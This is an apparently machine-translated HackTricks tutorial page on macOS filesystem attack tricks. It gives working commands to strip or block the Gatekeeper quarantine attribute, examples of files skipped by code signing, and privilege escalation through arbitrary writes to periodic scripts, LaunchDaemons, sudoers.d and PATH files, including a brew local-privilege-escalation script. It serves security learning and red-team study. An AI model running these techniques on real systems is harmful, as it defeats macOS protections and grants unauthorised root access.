# macOS FS Tricks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## POSIX permissions combinations

**ディレクトリ**内の権限:

* **読み取り** - ディレクトリエントリを**列挙**できます
* **書き込み** - ディレクトリ内の**ファイル**を**削除/書き込み**でき、**空のフォルダ**を**削除**できます。
* しかし、**書き込み権限**がない限り、**非空のフォルダ**を削除/変更することはできません。
* **フォルダの名前を変更**することは、そのフォルダの所有者でない限りできません。
* **実行** - ディレクトリを**横断**することが**許可**されています - この権利がないと、その中のファイルやサブディレクトリにアクセスできません。

### 危険な組み合わせ

**rootが所有するファイル/フォルダを上書きする方法**ですが:

* パス内の親**ディレクトリの所有者**がユーザーである
* パス内の親**ディレクトリの所有者**が**書き込みアクセス**を持つ**ユーザーグループ**である
* ユーザーの**グループ**が**ファイル**に**書き込み**アクセスを持つ

前述のいずれかの組み合わせで、攻撃者は**特権のある任意の書き込みを得るために**期待されるパスに**シンボリック/ハードリンク**を**注入**することができます。

### フォルダのroot R+X特別ケース

**rootのみがR+Xアクセスを持つ**ディレクトリ内にファイルがある場合、それは**他の誰にもアクセスできません**。したがって、**制限**のためにユーザーが読み取れない**ファイルを移動**することを許可する脆弱性があれば、このフォルダから**別のフォルダ**に移動することで、これらのファイルを読むことができるかもしれません。

例: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## シンボリックリンク / ハードリンク

特権プロセスが**ファイル**にデータを書き込んでいる場合、それは**低い特権のユーザー**によって**制御される**か、または低い特権のユーザーによって**以前に作成された**ものである可能性があります。ユーザーはシンボリックまたはハードリンクを介して**別のファイルを指す**だけで、特権プロセスはそのファイルに書き込みます。

攻撃者が**特権を昇格させるために任意の書き込みを悪用できる**他のセクションを確認してください。

## .fileloc

**`.fileloc`**拡張子のファイルは、他のアプリケーションやバイナリを指すことができるため、それらが開かれると、実行されるのはアプリケーション/バイナリになります。\
例:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Arbitrary FD

もし**プロセスが高い権限でファイルやフォルダを開くことができる**なら、**`crontab`**を悪用して**`EDITOR=exploit.py`**で`/etc/sudoers.d`内のファイルを開くことができ、そうすることで`exploit.py`は`/etc/sudoers`内のファイルへのFDを取得し、それを悪用します。

例えば: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Avoid quarantine xattrs tricks

### Remove it
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable フラグ

ファイル/フォルダにこの不変属性がある場合、xattrを設定することはできません。
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

**devfs** マウントは **xattr** をサポートしていません。詳細は [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) を参照してください。
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

このACLは、ファイルに`xattrs`を追加することを防ぎます。
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble**ファイル形式は、ファイルをそのACEを含めてコピーします。

[**ソースコード**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)を見ると、xattrの中に保存されているACLテキスト表現が**`com.apple.acl.text`**という名前で、解凍されたファイルのACLとして設定されることがわかります。したがって、他のxattrsが書き込まれるのを防ぐACLを持つ**AppleDouble**ファイル形式のzipファイルにアプリケーションを圧縮した場合... 検疫xattrはアプリケーションに設定されませんでした：

詳細については[**元の報告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)を確認してください。

これを再現するには、まず正しいacl文字列を取得する必要があります：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

本当に必要ではありませんが、念のためここに残しておきます：

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## コード署名のバイパス

バンドルには、**`_CodeSignature/CodeResources`** というファイルが含まれており、これは **バンドル** 内のすべての **ファイル** の **ハッシュ** を含んでいます。CodeResourcesのハッシュは **実行可能ファイル** にも **埋め込まれている** ため、それをいじることはできません。

ただし、署名がチェックされないファイルもいくつかあり、これらはplistにomitキーを持っています。
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
リソースの署名をCLIから計算することが可能です：

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## DMGをマウントする

ユーザーは、既存のフォルダーの上に作成されたカスタムDMGをマウントできます。これにより、カスタムコンテンツを含むカスタムDMGパッケージを作成できます：

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

通常、macOSは`com.apple.DiskArbitrarion.diskarbitrariond` Machサービス（`/usr/libexec/diskarbitrationd`によって提供される）と通信してディスクをマウントします。LaunchDaemons plistファイルに`-d`パラメータを追加して再起動すると、`/var/log/diskarbitrationd.log`にログを保存します。\
ただし、`hdik`や`hdiutil`のようなツールを使用して、`com.apple.driver.DiskImages` kextと直接通信することも可能です。

## 任意の書き込み

### 定期的なシェルスクリプト

あなたのスクリプトが**シェルスクリプト**として解釈される場合、毎日トリガーされる**`/etc/periodic/daily/999.local`**シェルスクリプトを上書きすることができます。

このスクリプトの実行を**偽装**することができます：**`sudo periodic daily`**

### デーモン

任意のスクリプトを実行するplistを持つ任意の**LaunchDaemon**を作成します。例えば、**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**のように：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.

### Sudoers File

If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.

### PATH files

The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.

You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.

## Generate writable files as other users

This will generate a file that belongs to root that is writable by me ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). This might also work as privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX共有メモリ

**POSIX共有メモリ**は、POSIX準拠のオペレーティングシステムにおいてプロセスが共通のメモリ領域にアクセスできるようにし、他のプロセス間通信方法と比較してより迅速な通信を促進します。これは、`shm_open()`を使用して共有メモリオブジェクトを作成または開き、`ftruncate()`でそのサイズを設定し、`mmap()`を使用してプロセスのアドレス空間にマッピングすることを含みます。プロセスはこのメモリ領域から直接読み書きできます。並行アクセスを管理し、データの破損を防ぐために、ミューテックスやセマフォなどの同期メカニズムがよく使用されます。最後に、プロセスは`munmap()`と`close()`で共有メモリをアンマップおよび閉じ、オプションで`shm_unlink()`でメモリオブジェクトを削除します。このシステムは、複数のプロセスが迅速に共有データにアクセスする必要がある環境で、効率的で迅速なIPCに特に効果的です。

<details>

<summary>プロデューサーコード例</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>消費者コードの例</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS ガード付きディスクリプタ

**macOS ガード付きディスクリプタ**は、ユーザーアプリケーションにおける**ファイルディスクリプタ操作**の安全性と信頼性を向上させるためにmacOSで導入されたセキュリティ機能です。これらのガード付きディスクリプタは、ファイルディスクリプタに特定の制限や「ガード」を関連付ける方法を提供し、これらはカーネルによって強制されます。

この機能は、**不正なファイルアクセス**や**レースコンディション**などの特定のクラスのセキュリティ脆弱性を防ぐのに特に役立ちます。これらの脆弱性は、例えばスレッドがファイルディスクリプタにアクセスしているときに**別の脆弱なスレッドがそれにアクセスできる**場合や、ファイルディスクリプタが**脆弱な子プロセスに継承される**場合に発生します。この機能に関連するいくつかの関数は次のとおりです：

* `guarded_open_np`: ガード付きでFDをオープン
* `guarded_close_np`: 閉じる
* `change_fdguard_np`: ディスクリプタのガードフラグを変更（ガード保護を削除することも可能）

## 参考文献

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**

</details>
{% endhint %}
